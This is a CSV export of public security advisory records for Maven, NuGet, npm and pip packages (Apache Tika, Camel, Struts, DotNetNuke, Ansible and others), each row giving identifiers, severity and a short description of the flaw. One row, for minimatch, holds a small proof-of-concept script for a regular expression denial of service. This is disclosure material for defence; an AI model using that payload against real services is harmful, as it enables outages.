1340,34455,org.apache.tika:tika-core,GHSA-p699-3wgc-7h72,CVE-2018-1339,https://github.com/advisories/GHSA-p699-3wgc-7h72,moderate,2018-10-17 15:43:59 UTC,Moderate severity vulnerability that affects org.apache.tika:tika-core,A carefully crafted (or fuzzed) file can trigger an infinite loop in Apache Tika's ChmParser in versions of Apache Tika before 1.18.,maven
1341,34455,org.apache.tika:tika-core,GHSA-9r24-gp44-h3pm,CVE-2018-1335,https://github.com/advisories/GHSA-9r24-gp44-h3pm,high,2018-10-17 15:43:43 UTC,High severity vulnerability that affects org.apache.tika:tika-core,"From Apache Tika versions 1.7 to 1.17, clients could send carefully crafted headers to tika-server that could be used to inject commands into the command line of the server running tika-server. This vulnerability only affects those running tika-server on a server that is open to untrusted clients. The mitigation is to upgrade to Tika 1.18.",maven
1342,34455,org.apache.tika:tika-core,GHSA-h8q5-g2cj-qr5h,CVE-2018-11796,https://github.com/advisories/GHSA-h8q5-g2cj-qr5h,high,2018-10-17 15:43:25 UTC,Apache Tika is vulnerable to entity expansions which can lead to a denial of service attack,"In Apache Tika 1.19 (CVE-2018-11761), we added an entity expansion limit for XML parsing. However, Tika reuses SAXParsers and calls reset() after each parse, which, for Xerces2 parsers, as per the documentation, removes the user-specified SecurityManager and thus removes entity expansion limits after the first parse. Apache Tika versions from 0.1 to 1.19 are therefore still vulnerable to entity expansions which can lead to a denial of service attack. Users should upgrade to 1.19.1 or later.",maven
1343,33885,org.apache.httpcomponents:httpclient,GHSA-fmj5-wv96-r2ch,CVE-2015-5262,https://github.com/advisories/GHSA-fmj5-wv96-r2ch,moderate,2018-10-17 00:05:29 UTC,Moderate severity vulnerability that affects org.apache.httpcomponents:httpclient,"http/conn/ssl/SSLConnectionSocketFactory.java in Apache HttpComponents HttpClient before 4.3.6 ignores the http.socket.timeout configuration setting during an SSL handshake, which allows remote attackers to cause a denial of service (HTTPS call hang) via unspecified vectors.",maven
1344,33885,org.apache.httpcomponents:httpclient,GHSA-2x83-r56g-cv47,CVE-2012-6153,https://github.com/advisories/GHSA-2x83-r56g-cv47,high,2018-10-17 00:05:15 UTC,High severity vulnerability that affects org.apache.httpcomponents:httpclient,"http/conn/ssl/AbstractVerifier.java in Apache Commons HttpClient before 4.2.3 does not properly verify that the server hostname matches a domain name in the subject's Common Name (CN) or subjectAltName field of the X.509 certificate, which allows man-in-the-middle attackers to spoof SSL servers via a certificate with a subject that specifies a common name in a field that is not the CN field. NOTE: this issue exists because of an incomplete fix for CVE-2012-5783.",maven
1345,33885,org.apache.httpcomponents:httpclient,GHSA-cfh5-3ghh-wfjx,CVE-2014-3577,https://github.com/advisories/GHSA-cfh5-3ghh-wfjx,moderate,2018-10-17 00:05:06 UTC,Moderate severity vulnerability that affects org.apache.httpcomponents:httpclient,"org.apache.http.conn.ssl.AbstractVerifier in Apache HttpComponents HttpClient before 4.3.5 and HttpAsyncClient before 4.0.2 does not properly verify that the server hostname matches a domain name in the subject's Common Name (CN) or subjectAltName field of the X.509 certificate, which allows man-in-the-middle attackers to spoof SSL servers via a ""CN="" string in a field in the distinguished name (DN) of a certificate, as demonstrated by the ""foo,CN=www.apache.org"" string in the O field.",maven
1346,38506,com.github.junrar:junrar,GHSA-5xqr-grq4-qwgx,CVE-2018-12418,https://github.com/advisories/GHSA-5xqr-grq4-qwgx,moderate,2018-10-17 00:04:05 UTC,Moderate severity vulnerability that affects com.github.junrar:junrar,"Archive.java in Junrar before 1.0.1, as used in Apache Tika and other products, is affected by a denial of service vulnerability due to an infinite loop when handling corrupt RAR files.",maven
1347,34261,org.apache.camel:camel-core,GHSA-h6rp-8v4j-hwph,CVE-2014-0003,https://github.com/advisories/GHSA-h6rp-8v4j-hwph,high,2018-10-16 23:13:49 UTC,High severity vulnerability that affects org.apache.camel:camel-core,"The XSLT component in Apache Camel 2.11.x before 2.11.4, 2.12.x before 2.12.3, and possibly earlier versions allows remote attackers to execute arbitrary Java methods via a crafted message.",maven
1348,34261,org.apache.camel:camel-core,GHSA-2fw5-rvf2-jq56,CVE-2014-0002,https://github.com/advisories/GHSA-2fw5-rvf2-jq56,high,2018-10-16 23:13:26 UTC,High severity vulnerability that affects org.apache.camel:camel-core,"The XSLT component in Apache Camel before 2.11.4 and 2.12.x before 2.12.3 allows remote attackers to read arbitrary files and possibly have other unspecified impact via an XML document containing an external entity declaration in conjunction with an entity reference, related to an XML External Entity (XXE) issue.",maven
1349,34261,org.apache.camel:camel-core,GHSA-vq9j-jh62-5hmp,CVE-2017-5643,https://github.com/advisories/GHSA-vq9j-jh62-5hmp,high,2018-10-16 23:13:11 UTC,Apache Camel using an outdated vulnerable JSON-lib library,Apache Camel's Validation Component is vulnerable against SSRF via remote DTDs and XXE.,maven
1350,37667,org.apache.camel:camel-jackson,GHSA-vvjc-q5vr-52q6,CVE-2016-8749,https://github.com/advisories/GHSA-vvjc-q5vr-52q6,critical,2018-10-16 23:13:00 UTC,Apache Camel's Jackson and JacksonXML unmarshalling operation are vulnerable to Remote Code Execution attacks,Apache Camel's Jackson and JacksonXML unmarshalling operation are vulnerable to Remote Code Execution attacks.,maven
1351,36020,org.apache.camel:camel-jetty,GHSA-26v6-w6fw-rh94,CVE-2015-5348,https://github.com/advisories/GHSA-26v6-w6fw-rh94,high,2018-10-16 23:12:20 UTC,Apache Camel can allow remote attackers to execute arbitrary commands,"Apache Camel 2.6.x through 2.14.x, 2.15.x before 2.15.5, and 2.16.x before 2.16.1, when using (1) camel-jetty or (2) camel-servlet as a consumer in Camel routes, allow remote attackers to execute arbitrary commands via a crafted serialized Java object in an HTTP request.",maven
1352,39656,org.apache.camel:camel-xstream,GHSA-gv5f-cjw9-5vxg,CVE-2015-5344,https://github.com/advisories/GHSA-gv5f-cjw9-5vxg,critical,2018-10-16 23:10:23 UTC,Camel-xstream component in Apache Camel can allow remote attackers to execute arbitrary commands,The camel-xstream component in Apache Camel before 2.15.5 and 2.16.x before 2.16.1 allow remote attackers to execute arbitrary commands via a crafted serialized Java object in an HTTP request.,maven
1353,34261,org.apache.camel:camel-core,GHSA-mhx2-r3jx-g94c,CVE-2015-0264,https://github.com/advisories/GHSA-mhx2-r3jx-g94c,moderate,2018-10-16 23:09:15 UTC,Moderate severity vulnerability that affects org.apache.camel:camel-core,Multiple XML external entity (XXE) vulnerabilities in builder/xml/XPathBuilder.java in Apache Camel before 2.13.4 and 2.14.x before 2.14.2 allow remote attackers to read arbitrary files via an external entity in an invalid XML (1) String or (2) GenericFile object in an XPath query.,maven
1354,34261,org.apache.camel:camel-core,GHSA-3hrc-f439-727g,CVE-2015-0263,https://github.com/advisories/GHSA-3hrc-f439-727g,moderate,2018-10-16 23:08:43 UTC,Moderate severity vulnerability that affects org.apache.camel:camel-core,XML external entity (XXE) vulnerability in the XML converter setup in converter/jaxp/XmlConverter.java in Apache Camel before 2.13.4 and 2.14.x before 2.14.2 allows remote attackers to read arbitrary files via an external entity in an SAXSource.,maven
1355,38296,org.apache.camel:camel-mail,GHSA-jv74-f9pj-xp3f,CVE-2018-8041,https://github.com/advisories/GHSA-jv74-f9pj-xp3f,moderate,2018-10-16 23:07:57 UTC,Apache Camel's Mail is vulnerable to path traversal,"Apache Camel's Mail 2.20.0 through 2.20.3, 2.21.0 through 2.21.1 and 2.22.0 is vulnerable to path traversal.",maven
1356,34261,org.apache.camel:camel-core,GHSA-8vfm-4388-6rpc,CVE-2018-8027,https://github.com/advisories/GHSA-8vfm-4388-6rpc,critical,2018-10-16 23:06:25 UTC,Apache is vulnerable to XXE in XSD validation processor,Apache Camel 2.20.0 to 2.20.3 and 2.21.0 Core is vulnerable to XXE in XSD validation processor.,maven
1357,34993,org.apache.ignite:ignite-core,GHSA-qcjv-wfcg-mmpr,CVE-2018-8018,https://github.com/advisories/GHSA-qcjv-wfcg-mmpr,critical,2018-10-16 20:53:54 UTC,Critical severity vulnerability that affects org.apache.ignite:ignite-core,"Apache Ignite 2.5 and earlier serialization mechanism does not have a list of classes allowed for serialization/deserialization, which makes it possible to run arbitrary code when 3-rd party vulnerable classes are present in Ignite classpath. The vulnerability can be exploited if the one sends a specially prepared form of a serialized object to GridClientJdkMarshaller deserialization endpoint.",maven
1358,34993,org.apache.ignite:ignite-core,GHSA-chp4-rv79-68j3,CVE-2018-1295,https://github.com/advisories/GHSA-chp4-rv79-68j3,critical,2018-10-16 20:53:44 UTC,Apache serialization mechanism does not have a list of classes allowed for serialization/deserialization,"In Apache Ignite 2.3 or earlier, the serialization mechanism does not have a list of classes allowed for serialization/deserialization, which makes it possible to run arbitrary code when 3-rd party vulnerable classes are present in Ignite classpath. The vulnerability can be exploited if the one sends a specially prepared form of a serialized object to one of the deserialization endpoints of some Ignite components - discovery SPI, Ignite persistence, Memcached endpoint, socket steamer.",maven
1359,34993,org.apache.ignite:ignite-core,GHSA-8qfc-cvjp-mgpq,CVE-2016-6805,https://github.com/advisories/GHSA-8qfc-cvjp-mgpq,moderate,2018-10-16 20:53:31 UTC,Moderate severity vulnerability that affects org.apache.ignite:ignite-core,Apache Ignite before 1.9 allows man-in-the-middle attackers to read arbitrary files via XXE in modified update-notifier documents.,maven
1360,34993,org.apache.ignite:ignite-core,GHSA-8p83-68cw-943f,CVE-2017-7686,https://github.com/advisories/GHSA-8p83-68cw-943f,high,2018-10-16 20:53:20 UTC,Apache Ignite communicates to an external PHP server where sensitive information is sent,"Apache Ignite 1.0.0-RC3 to 2.0 uses an update notifier component to update the users about new project releases that include additional functionality, bug fixes and performance improvements. To do that the component communicates to an external PHP server (http://ignite.run) where it needs to send some system properties like Apache Ignite or Java version. Some of the properties might contain user sensitive information.",maven
1361,13005,Microsoft.AspNetCore.App,GHSA-cgpw-2gph-2r9g,,https://github.com/advisories/GHSA-cgpw-2gph-2r9g,moderate,2018-10-16 19:59:59 UTC,"Moderate severity vulnerability that affects Microsoft.AspNetCore.All, Microsoft.AspNetCore.App, and Microsoft.AspNetCore.Server.Kestrel.Core","Microsoft is aware of a denial of service vulnerability in ASP.NET Core when a malformed request is terminated. An attacker who successfully exploited this vulnerability could cause a denial of service attack.

The update addresses the vulnerability by correcting how ASP.NET Core handles such requests.
",nuget
1362,12928,Microsoft.NETCore.UniversalWindowsPlatform,GHSA-jc8g-xhw5-6x46,CVE-2018-0786,https://github.com/advisories/GHSA-jc8g-xhw5-6x46,high,2018-10-16 19:59:05 UTC,Improper Certificate Validation in Microsoft .NET Framework components,"Microsoft .NET Framework 2.0 SP2, 3.0 SP2, 3.5, 3.5.1, 4.5.2, 4.6, 4.6.1, 4.6.2, 4.7, 4.7.1, .NET Core 1.0 and 2.0, and PowerShell Core 6.0.0 allow a security feature bypass vulnerability due to the way certificates are validated, aka "".NET Security Feature Bypass Vulnerability.""",nuget
1363,13021,Microsoft.Data.OData,GHSA-mv2r-q4g5-j8q5,CVE-2018-8269,https://github.com/advisories/GHSA-mv2r-q4g5-j8q5,high,2018-10-16 19:58:31 UTC,Denial of service in ASP.NET Core,"A denial of service vulnerability exists when OData Library improperly handles web requests, aka ""OData Denial of Service Vulnerability."" This affects Microsoft.Data.OData.",nuget
1364,13850,Microsoft.AspNetCore.HttpOverrides,GHSA-365p-96qv-xr7g,CVE-2018-0787,https://github.com/advisories/GHSA-365p-96qv-xr7g,high,2018-10-16 19:56:59 UTC,ASP.NET Core allow an elevation of privilege,"ASP.NET Core 1.0. 1.1, and 2.0 allow an elevation of privilege vulnerability due to how web applications that are created from templates validate web requests, aka ""ASP.NET Core Elevation Of Privilege Vulnerability"".",nuget
1365,13046,Microsoft.AspNetCore.Identity,GHSA-vhvh-528q-ff3p,CVE-2018-8171,https://github.com/advisories/GHSA-vhvh-528q-ff3p,high,2018-10-16 19:56:50 UTC,Security feature bypass vulnerability exists in ASP.NET when the number of incorrect login attempts is not validated,"A Security Feature Bypass vulnerability exists in ASP.NET when the number of incorrect login attempts is not validated, aka ""ASP.NET Security Feature Bypass Vulnerability."" This affects ASP.NET, ASP.NET Core 1.1, ASP.NET Core 1.0, ASP.NET Core 2.0, ASP.NET MVC 5.2.",nuget
1366,13005,Microsoft.AspNetCore.App,GHSA-j378-6mmw-hqfr,CVE-2018-8409,https://github.com/advisories/GHSA-j378-6mmw-hqfr,high,2018-10-16 19:56:38 UTC,Denial of service vulnerability exists when System.IO.Pipelines improperly handles requests,"A denial of service vulnerability exists when System.IO.Pipelines improperly handles requests, aka ""System.IO.Pipelines Denial of Service."" This affects .NET Core 2.1, System.IO.Pipelines, ASP.NET Core 2.1.",nuget
1367,13303,System.Security.Cryptography.Xml,GHSA-35hc-x2cw-2j4v,CVE-2018-0765,https://github.com/advisories/GHSA-35hc-x2cw-2j4v,high,2018-10-16 19:54:06 UTC,Denial of service vulnerability exists when .NET and .NET Core improperly process XML documents,"A denial of service vulnerability exists when .NET and .NET Core improperly process XML documents, aka "".NET and .NET Core Denial of Service Vulnerability."" This affects Microsoft .NET Framework 2.0, Microsoft .NET Framework 3.0, Microsoft .NET Framework 4.7.1, Microsoft .NET Framework 4.6/4.6.1/4.6.2/4.7/4.7.1, Microsoft .NET Framework 4.5.2, Microsoft .NET Framework 4.7/4.7.1, Microsoft .NET Framework 4.6, Microsoft .NET Framework 3.5, Microsoft .NET Framework 3.5.1, Microsoft .NET Framework 4.6/4.6.1/4.6.2, Microsoft .NET Framework 4.6.2/4.7/4.7.1, .NET Core 2.0, Microsoft .NET Framework 4.7.2.",nuget
1368,36436,org.apache.qpid:proton-j,GHSA-f5cf-f7px-xpmh,CVE-2016-2166,https://github.com/advisories/GHSA-f5cf-f7px-xpmh,moderate,2018-10-16 19:50:27 UTC,Moderate severity vulnerability that affects org.apache.qpid:proton-j,"The (1) proton.reactor.Connector, (2) proton.reactor.Container, and (3) proton.utils.BlockingConnection classes in Apache Qpid Proton before 0.12.1 improperly use an unencrypted connection for an amqps URI scheme when SSL support is unavailable, which might allow man-in-the-middle attackers to obtain sensitive information or modify data via unspecified vectors.",maven
1369,35760,org.apache.qpid:qpid-broker,GHSA-jj9h-mwhq-8vhm,CVE-2016-3094,https://github.com/advisories/GHSA-jj9h-mwhq-8vhm,moderate,2018-10-16 19:50:13 UTC,Moderate severity vulnerability that affects org.apache.qpid:qpid-broker,"PlainSaslServer.java in Apache Qpid Java before 6.0.3, when the broker is configured to allow plaintext passwords, allows remote attackers to cause a denial of service (broker termination) via a crafted authentication attempt, which triggers an uncaught exception.",maven
1370,38291,org.apache.juddi:juddi-client,GHSA-49h4-g8p5-jgq6,CVE-2015-5241,https://github.com/advisories/GHSA-49h4-g8p5-jgq6,moderate,2018-10-16 19:49:32 UTC,Moderate severity vulnerability that affects org.apache.juddi:juddi-client,"After logging into the portal, the logout jsp page redirects the browser back to the login page after. It is feasible for malicious users to redirect the browser to an unintended web page in Apache jUDDI 3.1.2, 3.1.3, 3.1.4, and 3.1.5 when utilizing the portlets based user interface also known as 'Pluto', 'jUDDI Portal', 'UDDI Portal' or 'uddi-console'. User session data, credentials, and auth tokens are cleared before the redirect.",maven
1371,34974,org.apache.struts:struts2-core,GHSA-x5x7-3v85-wpc4,CVE-2017-9804,https://github.com/advisories/GHSA-x5x7-3v85-wpc4,high,2018-10-16 19:37:33 UTC,Apache Struts allows entering a custom URL in a form field if built-in URLValidator is used,"In Apache Struts 2.3.7 through 2.3.33 and 2.5 through 2.5.12, if an application allows entering a URL in a form field and built-in URLValidator is used, it is possible to prepare a special URL which will be used to overload server process when performing validation of the URL.  NOTE: this vulnerability exists because of an incomplete fix for S2-047 / CVE-2017-7672.",maven
1372,34974,org.apache.struts:struts2-core,GHSA-8mr5-h28g-36qx,CVE-2017-9787,https://github.com/advisories/GHSA-8mr5-h28g-36qx,high,2018-10-16 19:37:07 UTC,Spring AOP functionality (Struts) vulnerable to DoS attack,When using a Spring AOP functionality to secure Struts actions it is possible to perform a DoS attack. Solution is to upgrade to Apache Struts version 2.5.12 or 2.3.33.,maven
1373,34974,org.apache.struts:struts2-core,GHSA-9gp7-jvm2-r4mx,CVE-2017-7672,https://github.com/advisories/GHSA-9gp7-jvm2-r4mx,moderate,2018-10-16 19:36:43 UTC,Moderate severity vulnerability that affects org.apache.struts:struts2-core,"If an application allows enter an URL in a form field and built-in URLValidator is used, it is possible to prepare a special URL which will be used to overload server process when performing validation of the URL. Solution is to upgrade to Apache Struts version 2.5.12.",maven
1374,34974,org.apache.struts:struts2-core,GHSA-8fx9-5hx8-crhm,CVE-2017-12611,https://github.com/advisories/GHSA-8fx9-5hx8-crhm,critical,2018-10-16 19:35:40 UTC,Apache Struts 2.0.1 uses an unintentional expression in a Freemarker tag instead of string literal,"In Apache Struts 2.0.1 through 2.3.33 and 2.5 through 2.5.10, using an unintentional expression in a Freemarker tag instead of string literals can lead to a RCE attack.",maven
1375,15223,DotNetNuke.Core,GHSA-x2rg-fmcv-crq5,CVE-2017-9822,https://github.com/advisories/GHSA-x2rg-fmcv-crq5,high,2018-10-16 19:34:22 UTC,DNN (aka DotNetNuke) has Remote Code Execution via a cookie,"DNN (aka DotNetNuke) before 9.1.1 has Remote Code Execution via a cookie, aka ""2017-08 (Critical) Possible remote code execution on DNN sites.""",nuget
1376,15223,DotNetNuke.Core,GHSA-5c66-x4wm-rjfx,CVE-2016-7119,https://github.com/advisories/GHSA-5c66-x4wm-rjfx,moderate,2018-10-16 19:34:10 UTC,Cross-site scripting (XSS) vulnerability in the user-profile biography section in DotNetNuke (DNN),Cross-site scripting (XSS) vulnerability in the user-profile biography section in DotNetNuke (DNN) before 8.0.1 allows remote authenticated users to inject arbitrary web script or HTML via a crafted onclick attribute in an IMG element.,nuget
1377,15223,DotNetNuke.Core,GHSA-x8f7-h444-97w4,CVE-2015-2794,https://github.com/advisories/GHSA-x8f7-h444-97w4,critical,2018-10-16 19:33:42 UTC,The installation wizard in DotNetNuke (DNN) allows privilege escalation,The installation wizard in DotNetNuke (DNN) before 7.4.1 allows remote attackers to reinstall the application and gain SuperUser access via a direct request to Install/InstallWizard.aspx.,nuget
1378,15223,DotNetNuke.Core,GHSA-v76m-f5cx-8rg4,CVE-2015-1566,https://github.com/advisories/GHSA-v76m-f5cx-8rg4,moderate,2018-10-16 19:33:25 UTC,Moderate severity vulnerability that affects DotNetNuke.Core,Cross-site scripting (XSS) vulnerability in DotNetNuke (DNN) before 7.4.0 allows remote attackers to inject arbitrary web script or HTML via unspecified vectors.,nuget
1379,37675,org.bouncycastle:bcprov-jdk14,GHSA-xqj7-j8j5-f2xr,CVE-2018-1000180,https://github.com/advisories/GHSA-xqj7-j8j5-f2xr,high,2018-10-16 17:44:39 UTC,Bouncy Castle has a flaw in the Low-level interface to RSA key pair generator,"Bouncy Castle BC 1.54 - 1.59, BC-FJA 1.0.0, BC-FJA 1.0.1 and earlier have a flaw in the Low-level interface to RSA key pair generator, specifically RSA Key Pairs generated in low-level API with added certainty may have less M-R tests than expected. This appears to be fixed in versions BC 1.60 beta 4 and later, BC-FJA 1.0.2 and later.",maven
1380,33906,org.springframework:spring-core,GHSA-f26x-pr96-vw86,CVE-2018-11040,https://github.com/advisories/GHSA-f26x-pr96-vw86,moderate,2018-10-16 17:43:45 UTC,Moderate severity vulnerability that affects org.springframework:spring-core,"Spring Framework, versions 5.0.x prior to 5.0.7 and 4.3.x prior to 4.3.18 and older unsupported versions, allows web applications to enable cross-domain requests via JSONP (JSON with Padding) through AbstractJsonpResponseBodyAdvice for REST controllers and MappingJackson2JsonView for browser requests. Both are not enabled by default in Spring Framework nor Spring Boot, however, when MappingJackson2JsonView is configured in an application, JSONP support is automatically ready to use through the ""jsonp"" and ""callback"" JSONP parameters, enabling cross-domain requests.",maven
1381,33906,org.springframework:spring-core,GHSA-9gcm-f4x3-8jpw,CVE-2018-11039,https://github.com/advisories/GHSA-9gcm-f4x3-8jpw,moderate,2018-10-16 17:35:54 UTC,Moderate severity vulnerability that affects org.springframework:spring-core,"Spring Framework (versions 5.0.x prior to 5.0.7, versions 4.3.x prior to 4.3.18, and older unsupported versions) allow web applications to change the HTTP request method to any HTTP method (including TRACE) using the HiddenHttpMethodFilter in Spring MVC. If an application has a pre-existing XSS vulnerability, a malicious user (or attacker) can use this filter to escalate to an XST (Cross Site Tracing) attack.",maven
1382,34729,org.apache.storm:storm-core,GHSA-898j-5cc8-cmf5,CVE-2018-8008,https://github.com/advisories/GHSA-898j-5cc8-cmf5,moderate,2018-10-16 17:35:24 UTC,Moderate severity vulnerability that affects org.apache.storm:storm-core,"Apache Storm version 1.0.6 and earlier, 1.2.1 and earlier, and version 1.1.2 and earlier expose an arbitrary file write vulnerability, that can be achieved using a specially crafted zip archive (affects other archives as well, bzip2, tar, xz, war, cpio, 7z), that holds path traversal filenames. So when the filename gets concatenated to the target extraction directory, the final path ends up outside of the target folder.",maven
1383,13303,System.Security.Cryptography.Xml,GHSA-rr3c-f55v-qhv5,CVE-2018-0764,https://github.com/advisories/GHSA-rr3c-f55v-qhv5,high,2018-10-16 17:34:00 UTC,Denial of service vulnerability exists when .NET and .NET Core improperly process XML documents,"Microsoft .NET Framework 1.1, 2.0, 3.0, 3.5, 3.5.1, 4, 4.5, 4.5.1, 4.5.2, 4.6, 4.6.1, 4.6.2 and 5.7 and .NET Core 1.0. 1.1 and 2.0 allow a denial of service vulnerability due to the way XML documents are processed, aka "".NET and .NET Core Denial Of Service Vulnerability"". This CVE is unique from CVE-2018-0765.",nuget
1384,15223,DotNetNuke.Core,GHSA-g8j6-m4p7-5rfq,CVE-2017-0929,https://github.com/advisories/GHSA-g8j6-m4p7-5rfq,high,2018-10-16 17:18:12 UTC,High severity vulnerability that affects DotNetNuke.Core,DNN (aka DotNetNuke) before 9.2.0 suffers from a Server-Side Request Forgery (SSRF) vulnerability in the DnnImageHandler class. Attackers may be able to access information about internal network resources.,nuget
1385,13042,DotNetZip,GHSA-7378-6268-4278,CVE-2018-1002205,https://github.com/advisories/GHSA-7378-6268-4278,high,2018-10-16 17:16:40 UTC,High severity vulnerability that affects DotNetZip,"DotNetZip.Semvered before 1.11.0 is vulnerable to directory traversal, allowing attackers to write to arbitrary files via a ../ (dot dot slash) in a Zip archive entry that is mishandled during extraction. This vulnerability is also known as 'Zip-Slip'.",nuget
1386,13070,YamlDotNet,GHSA-rpch-cqj9-h65r,CVE-2018-1000210,https://github.com/advisories/GHSA-rpch-cqj9-h65r,high,2018-10-16 17:01:10 UTC,High severity vulnerability that affects YamlDotNet and YamlDotNet.Signed,"YamlDotNet version 4.3.2 and earlier contains a Insecure Direct Object Reference vulnerability in The default behavior of Deserializer.Deserialize() will deserialize user-controlled types in the line ""currentType = Type.GetType(nodeEvent.Tag.Substring(1), throwOnError: false);"" and blindly instantiates them. that can result in Code execution in the context of the running process. This attack appear to be exploitable via Victim must parse a specially-crafted YAML file. This vulnerability appears to have been fixed in 5.0.0.",nuget
1387,16863,next,GHSA-qw96-mm2g-c8m7,CVE-2018-18282,https://github.com/advisories/GHSA-qw96-mm2g-c8m7,moderate,2018-10-15 21:43:12 UTC,Next.js has cross site scripting (XSS) vulnerability via the 404 or 500 /_error page,Next.js 7.0.0 and 7.0.1 has XSS via the 404 or 500 /_error page.,npm
1388,17146,tough-cookie,GHSA-qhv9-728r-6jqg,CVE-2016-1000232,https://github.com/advisories/GHSA-qhv9-728r-6jqg,moderate,2018-10-10 18:57:02 UTC,ReDoS via long string of semicolons in tough-cookie,"Affected versions of `tough-cookie` may be vulnerable to regular expression denial of service when long strings of semicolons exist in the `Set-Cookie` header.


## Recommendation

Update to version 2.3.0 or later.",npm
1389,20092,ansible,GHSA-m956-frf4-m2wr,CVE-2016-9587,https://github.com/advisories/GHSA-m956-frf4-m2wr,high,2018-10-10 17:22:53 UTC,Ansible is vulnerable to an improper input validation in Ansible's handling of data sent from client systems,"Ansible before versions 2.1.4, 2.2.1 is vulnerable to an improper input validation in Ansible's handling of data sent from client systems. An attacker with control over a client system being managed by Ansible and the ability to send facts back to the Ansible server could use this flaw to execute arbitrary code on the Ansible server using the Ansible server privileges.",pip
1390,20092,ansible,GHSA-jg4f-jqm5-4mgq,CVE-2016-8628,https://github.com/advisories/GHSA-jg4f-jqm5-4mgq,critical,2018-10-10 17:23:14 UTC,Ansible fails to properly sanitize fact variables sent from the Ansible controller,Ansible before version 2.2.0 fails to properly sanitize fact variables sent from the Ansible controller. An attacker with the ability to create special variables on the controller could execute arbitrary commands on Ansible clients as the user Ansible runs as.,pip
1391,20092,ansible,GHSA-jwcc-j78w-j73w,CVE-2018-10855,https://github.com/advisories/GHSA-jwcc-j78w-j73w,high,2018-10-10 17:23:20 UTC,High severity vulnerability that affects ansible,"Ansible 2.5 prior to 2.5.5, and 2.4 prior to 2.4.5, do not honor the no_log task flag for failed tasks. When the no_log flag has been used to protect sensitive data passed to a task from being logged, and that task does not run successfully, Ansible will expose sensitive data in log files and on the terminal of the user running Ansible.",pip
1392,20092,ansible,GHSA-cmwx-9m2h-x7v4,CVE-2016-8614,https://github.com/advisories/GHSA-cmwx-9m2h-x7v4,high,2018-10-10 17:23:26 UTC,Ansible apt_key module does not properly verify key fingerprint,"A flaw was found in Ansible before version 2.2.0. The apt_key module does not properly verify key fingerprints, allowing remote adversary to create an OpenPGP key which matches the short key ID and inject this key instead of the correct key.",pip
1393,20092,ansible,GHSA-x4cm-m36h-c6qj,CVE-2016-8647,https://github.com/advisories/GHSA-x4cm-m36h-c6qj,moderate,2018-10-10 17:23:33 UTC,Moderate severity vulnerability that affects ansible,"An input validation vulnerability was found in Ansible's mysql_user module before 2.2.1.0, which may fail to correctly change a password in certain circumstances. Thus the previous password would still be active when it should have been changed.",pip
1394,20092,ansible,GHSA-9x6q-5423-w5v9,CVE-2013-2233,https://github.com/advisories/GHSA-9x6q-5423-w5v9,high,2018-10-10 17:23:39 UTC,Ansible fails to cache SSH host keys,Ansible before 1.2.1 makes it easier for remote attackers to conduct man-in-the-middle attacks by leveraging failure to cache SSH host keys.,pip
1395,19893,marshmallow,GHSA-9q2p-fj49-vpxj,CVE-2018-17175,https://github.com/advisories/GHSA-9q2p-fj49-vpxj,moderate,2018-10-10 16:10:46 UTC,"In marshmallow library the schema ""only"" option treats an empty list as implying no ""only"" option","In the marshmallow library before 2.15.1 and 3.x before 3.0.0b9 for Python, the schema ""only"" option treats an empty list as implying no ""only"" option, which allows a request that was intended to expose no fields to instead expose all fields (if the schema is being filtered dynamically using the ""only"" option, and there is a user role that produces an empty value for ""only"").",pip
1396,19896,paramiko,GHSA-f2j6-wrhh-v25m,CVE-2018-1000805,https://github.com/advisories/GHSA-f2j6-wrhh-v25m,high,2018-10-10 16:10:10 UTC,High severity vulnerability that affects paramiko,"Paramiko version 2.4.1, 2.3.2, 2.2.3, 2.1.5, 2.0.8, 1.18.5, 1.17.6 contains a Incorrect Access Control vulnerability in SSH server that can result in RCE. This attack appear to be exploitable via network connectivity.",pip
1397,17093,send,GHSA-pgv6-jrvv-75jp,,https://github.com/advisories/GHSA-pgv6-jrvv-75jp,moderate,2018-10-09 00:34:30 UTC,Moderate severity vulnerability that affects send,"Withdrawn, accidental duplicate publish.

visionmedia send before 0.8.4 for Node.js uses a partial comparison for verifying whether a directory is within the document root, which allows remote attackers to access restricted directories, as demonstrated using ""public-restricted"" under a ""public"" directory.",npm
1398,16125,qs,GHSA-crvj-3gj9-gm2p,,https://github.com/advisories/GHSA-crvj-3gj9-gm2p,high,2018-10-09 00:44:29 UTC,High severity vulnerability that affects qs,"Withdrawn, accidental duplicate publish.

The qs module before 1.0.0 in Node.js does not call the compact function for array data, which allows remote attackers to cause a denial of service (memory consumption) by using a large index value to create a sparse array.",npm
1399,16125,qs,GHSA-f9cm-p3w6-xvr3,CVE-2014-10064,https://github.com/advisories/GHSA-f9cm-p3w6-xvr3,high,2018-10-09 00:38:48 UTC,Denial-of-Service Extended Event Loop Blocking in qs,"Versions prior to 1.0.0 of `qs` are affected by a denial of service vulnerability that results from excessive recursion in parsing a deeply nested JSON string.




## Recommendation

Update to version 1.0.0 or later",npm
1400,16195,minimatch,GHSA-hxm2-r34f-qmc5,CVE-2016-10540,https://github.com/advisories/GHSA-hxm2-r34f-qmc5,high,2018-10-09 00:40:41 UTC,Regular Expression Denial of Service in minimatch,"Affected versions of `minimatch` are vulnerable to regular expression denial of service attacks when user input is passed into the `pattern` argument of `minimatch(path, pattern)`.


## Proof of Concept
```
var minimatch = require(“minimatch”);

// utility function for generating long strings
var genstr = function (len, chr) {
  var result = “”;
  for (i=0; i<=len; i++) {
    result = result + chr;
  }
  return result;
}

var exploit = “[!” + genstr(1000000, “\\”) + “A”;

// minimatch exploit.
console.log(“starting minimatch”);
minimatch(“foo”, exploit);
console.log(“finishing minimatch”);
```


## Recommendation

Update to version 3.0.2 or later.",npm
1401,15900,uglify-js,GHSA-g6f4-j6c2-w3p3,,https://github.com/advisories/GHSA-g6f4-j6c2-w3p3,high,2018-10-09 00:39:43 UTC,High severity vulnerability that affects uglify-js,"Withdrawn, accidental duplicate publish.

The uglify-js package before 2.4.24 for Node.js does not properly account for non-boolean values when rewriting boolean expressions, which might allow attackers to bypass security mechanisms or possibly have unspecified other impact by leveraging improperly rewritten Javascript.",npm
1402,16290,mustache,GHSA-3233-rgx3-c2wh,,https://github.com/advisories/GHSA-3233-rgx3-c2wh,moderate,2018-10-09 00:38:09 UTC,Moderate severity vulnerability that affects mustache,"Withdrawn, accidental duplicate publish.

mustache package before 2.2.1 for Node.js allows remote attackers to conduct cross-site scripting (XSS) attacks by leveraging a template with an attribute that is not quoted.",npm
